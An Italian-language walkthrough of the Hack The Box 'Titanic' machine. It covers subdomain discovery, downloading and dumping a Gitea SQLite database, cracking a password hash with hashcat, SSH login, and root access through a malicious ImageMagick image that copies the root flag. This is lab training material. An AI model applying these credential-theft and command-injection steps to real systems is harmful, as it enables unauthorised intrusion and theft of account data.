# Titanic - Hack The Box Walkthrough

## 🕵️‍♂️ Primo Step: Ricognizione

La prima cosa che ho fatto è stata una scansione della rete con **nmap** per individuare porte aperte e servizi attivi.

```bash
nmap -sC -sV -T4 -oN scan.txt <IP>
```

L'output non ha rivelato nulla di particolarmente interessante, quindi ho deciso di analizzare il sito web principale. Dopo un'ispezione manuale senza successo, ho eseguito una scansione con **Gobuster** per cercare sottodomini.

```bash
gobuster dns -d <target> -w wordlist.txt
```

Grazie a questa scansione, ho trovato un sottodominio chiamato `dev`.

Visitando `dev.<target>`, ho scoperto che si trattava di un'istanza di **Gitea**, una piattaforma simile a GitHub per il versionamento del codice. Esplorando il repository pubblico, ho individuato un utente chiamato `developer`, che potrebbe essere interessante.

Scorrendo tra i file caricati, ho trovato dei file di configurazione, uno relativo a **Gitea** e un altro a **MySQL**.

## 📂 Accesso al Database

Ho tentato di connettermi direttamente a MySQL, ma la porta non era aperta. Tuttavia, consultando la documentazione di Gitea, ho scoperto che il database `gitea.db` si trova nel percorso `data/gitea`. Ho provato a scaricarlo con **curl**:

```bash
curl -O http://dev.<target>/data/gitea/gitea.db
```

Aprendo il database con **sqlite3**, ho trovato la tabella `user` contenente gli hash delle password.

```bash
sqlite3 gitea.db
sqlite> .tables
sqlite> SELECT * FROM user;
```

L'hash della password era in un formato specifico di Gitea. Per decodificarlo in un formato leggibile da **hashcat**, ho usato uno script Python trovato su GitHub.

```bash
python convert_hash.py gitea_hash.txt
```

Dopo la conversione, ho lanciato **hashcat** per effettuare un attacco brute-force usando la wordlist `rockyou.txt`.

```bash
hashcat -m <mode> hash.txt rockyou.txt --force
```

Dopo qualche minuto, ho trovato la password: **25282528**.

## 🔑 Accesso SSH e User Flag

Ora che ho una password valida, ho provato ad accedere tramite SSH all'utente `developer`:

```bash
ssh developer@<IP>
```

Una volta dentro, ho esplorato la directory home dell'utente e ho trovato la **user flag**!

```bash
cat user.txt
```

## 🚀 Privilege Escalation

Per ottenere i privilegi di root, ho iniziato controllando i permessi di `sudo`:

```bash
sudo -l
```

Purtroppo, non ho trovato comandi eseguibili senza password. Ho quindi esplorato il sistema in cerca di file o processi interessanti.

Dopo un po' di ricerca, ho trovato un file che utilizza una versione vulnerabile di **ImageMagick**.

## 🎨 Exploit di ImageMagick

La versione installata di ImageMagick presenta una vulnerabilità che permette l'esecuzione di codice arbitrario incorporato nelle immagini. Ho trovato una guida di **IppSec** che spiega come sfruttare questo bug.

Per sfruttare la vulnerabilità, ho utilizzato uno script Python per generare un'immagine malevola contenente un comando che copia la flag root in `/tmp/root.txt`.

```bash
python script.py -o exploit.png -c "cp /root/root.txt /tmp/root.txt"
```

Dopo aver caricato l'immagine nel sistema, il codice è stato eseguito con successo. Ho quindi potuto leggere la **root flag**!

```bash
cat /tmp/root.txt
```

---

## 🎯 Conclusione

Questa macchina ha richiesto un mix di tecniche di **ricognizione**, **exploit di Gitea**, **cracking di hash**, e **privilege escalation tramite ImageMagick**. È stata una sfida interessante che ha messo alla prova diverse competenze. 🚀
